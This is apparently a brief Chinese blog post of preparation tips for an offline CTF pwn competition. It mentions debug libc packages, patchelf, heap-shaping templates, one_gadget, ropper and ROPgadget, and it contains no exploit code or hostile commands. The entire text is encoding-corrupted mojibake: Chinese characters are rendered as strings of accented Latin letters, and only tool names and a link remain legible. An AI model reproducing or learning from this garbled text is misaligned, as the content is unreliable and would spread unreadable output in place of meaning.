é¦–å…ˆæ‰“æ–­ç½‘çº¿ä¸‹èµ›ï¼Œä¸€å®šè¦ä¿è¯ç¯å¢ƒï¼Œå¤šè·Ÿé˜Ÿå‹äº¤æµï¼Œæ¯”èµ›å‰æŠŠç¯å¢ƒæµ‹è¯•å¥½ï¼Œä»¥å…å‡ºç°æ¯”èµ›æ—¶å‘ç° python èµ·ä¸äº† http.server ä¸”æ²¡æœ‰ U ç›˜çš„æƒ…å†µã€‚

æå‰æŠŠå„ä¸ªç‰ˆæœ¬çš„ libc-dbg.deb åŒ…éƒ½ä¸‹å¥½ï¼Œä»¥å…é‡åˆ°é¢˜ç›®æƒ³å¸¦æºç è°ƒè¯• IOFILE æ—¶æŠ“çã€‚

æ¯”èµ›å‰æŠŠæ¿å­ä»€ä¹ˆçš„å‡†å¤‡å¥½ï¼Œå¹³å¸¸å°±å¯ä»¥å¤šç§¯ç´¯ï¼Œæ¯”èµ›æ—¶äº‰åˆ†å¤ºç§’çš„ç¯å¢ƒä¸‹ä¸ä¸€å®šæœ‰æ—¶é—´æ…¢æ…¢å †é£æ°´ï¼Œè¿™ä¸ªæ—¶å€™æå‰å‡†å¤‡å¥½çš„å¯ä»¥ç›´æ¥å¥—ç”¨çš„é£æ°´ trick å°±æ´¾ä¸Šå¤§ç”¨åœºäº†ã€‚

å¦å¤–å­¦ä¼šçµæ´»ç”¨ patchelfï¼Œå¾ˆå¤šæ—¶å€™å‡ºé¢˜äººç»™çš„ ld å¹¶ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œpatch äº† libc åå¯ä»¥æ ¹æ® libc çš„ç‰ˆæœ¬æ¥é€‰æ‹©å¤§ç‰ˆæœ¬ä¸€è‡´å°ç‰ˆæœ¬æœ‰ä¸€ç‚¹ä¸ä¸€æ ·çš„ ld æ¥æ‰“ï¼Œä¹Ÿå¯ä»¥ç”¨ [docker env](https://hub.docker.com/r/roderickchan/debug_pwn_env/tags)ã€‚

å†å°±æ˜¯å¯ä»¥ä½¿ç”¨è”ç½‘åŠŸèƒ½ï¼Œæ¯”å¦‚ gdb çš„ debuginfod æœåŠ¡å™¨ å’Œ pwninit è¿™ç§å·¥å…·ï¼Œä½†æ˜¯è¦çŸ¥é“æ€ä¹ˆå…³/ä»£æ›¿ï¼Œä¸ç„¶æ–­ç½‘çš„æ—¶å€™æ¯æ¬¡è°ƒè¯•å‰éƒ½å¾—ç­‰å¾… web è®¿é—®è¶…æ—¶å¤ªæŠ˜ç£¨äº†ã€‚


æŠ€æœ¯å±‚é¢çš„ï¼š

1. ogg çœŸå¾—ä¸€ä¸ªä¸€ä¸ªå°è¯•
2. ropper + ROPgadget

å…¶å®è¿™ç§æ”¿æ²»æ¯”èµ›ä¸€èˆ¬æ²¡æœ‰ç‰¹åˆ«éš¾çš„é¢˜ç›®ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯éšä¾¿æ‰“ï¼Œå‰ææ˜¯ä¿è¯ç†Ÿç»ƒåº¦ + å°‘çŠ¯é”™ã€‚

æœ€åè¯´ä¸€å¥æˆ‘ä»¬æ˜¯å† å†›ï¼Œå››å·çœèµ› pwn è¿˜æ˜¯å¤ª 1z äº†ã€‚
